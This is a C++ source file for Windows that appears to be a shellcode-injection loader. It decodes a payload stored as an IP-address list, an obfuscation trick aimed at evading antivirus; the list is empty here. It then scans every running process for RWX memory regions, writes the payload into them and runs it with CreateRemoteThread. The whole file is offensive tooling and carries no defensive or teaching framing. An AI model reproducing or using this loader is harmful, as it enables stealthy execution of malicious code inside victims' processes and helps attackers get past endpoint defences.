#include <windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <TlHelp32.h>

std::vector<unsigned char> ipAddressesToBytes(const std::vector<std::string>& ipAddresses) {
    std::vector<unsigned char> byteArray;

    for (const auto& ip : ipAddresses) {
        std::stringstream ss(ip);
        std::string segment;
        while (getline(ss, segment, '.')) {
            int byteValue = stoi(segment);
            byteArray.push_back(static_cast<unsigned char>(byteValue));
        }
    }

    return byteArray;
}



int main() {
    std::vector < std::string > ipAddresses = {
        
    };


    auto byteArray = ipAddressesToBytes(ipAddresses);
    size_t byteVarSize = byteArray.size();

    unsigned char* byteVar = new unsigned char[byteArray.size()];

    for (size_t i = 0; i < byteVarSize; ++i) {
        byteVar[i] = byteArray[i];
    }
    
    MEMORY_BASIC_INFORMATION mbi = {};
    LPVOID offset = 0;
    HANDLE process = NULL;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    DWORD bytesWritten = 0;
    Process32First(snapshot, &processEntry);
    while (Process32Next(snapshot, &processEntry))
    {
        process = OpenProcess(MAXIMUM_ALLOWED, false, processEntry.th32ProcessID);
        if (process)
        {
            std::wcout << processEntry.szExeFile << "\n";
            while (VirtualQueryEx(process, offset, &mbi, sizeof(mbi)))
            {
                offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
                {
                    std::cout << "\tRWX: 0x" << std::hex << mbi.BaseAddress << "\n";
                    WriteProcessMemory(process, mbi.BaseAddress, byteVar, byteVarSize, NULL);
                    HANDLE hThread = CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
                    WaitForSingleObject(hThread, INFINITE);
                    break;
                }
            }
            offset = 0;
        }
        CloseHandle(process);
    }

    return 0;

}

